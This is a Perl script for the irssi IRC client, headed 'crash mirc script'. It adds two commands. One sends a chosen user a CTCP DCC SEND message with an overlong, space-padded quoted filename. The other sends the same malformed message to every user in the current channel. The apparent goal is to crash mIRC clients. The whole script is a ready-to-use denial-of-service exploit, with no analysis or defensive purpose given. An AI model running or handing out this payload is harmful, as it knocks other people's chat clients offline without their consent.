##################################################
# crash mirc script for irssi
##################################################

use Irssi;
use Irssi::Irc;

sub own_all {
    my ( $data, $server, $channel, $witem ) = @_;

    if ( !$channel || $channel->{type} ne 'CHANNEL' ) {
        Irssi::print('No active channel in window');
        return;
    }

    foreach my $nick ( $channel->nicks() ) {
        $channel->command( "/quote privmsg "
              . $nick->{nick}
              . " :\cADCC SEND \"x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x\" 0 0 0\cA"
        );

    }
}

sub owned {
    my ( $data, $server, $witem ) = @_;
    $data =~ s{\s+$}{};
    $nick = $data;

    $witem->command(
"/msg $nick \cADCC SEND \"x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x\" 0 0 0\cA"
    );
}

Irssi::command_bind( 'owned',   'owned' );
Irssi::command_bind( 'own_all', 'own_all' );
